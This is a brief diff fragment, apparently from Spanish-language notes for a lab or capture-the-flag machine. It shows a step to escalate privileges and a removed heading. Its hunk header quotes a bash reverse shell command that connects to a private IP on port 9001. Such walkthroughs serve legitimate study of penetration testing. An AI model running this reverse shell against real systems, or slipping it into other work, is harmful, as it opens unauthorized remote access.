@@ -147,4 +147,3 @@ setsid bash -c 'bash -i >& /dev/tcp/10.10.15.4/9001 0>&1' < /dev/null &
 
 7. Escalar privilegios en la máquina.
 
-## Relac
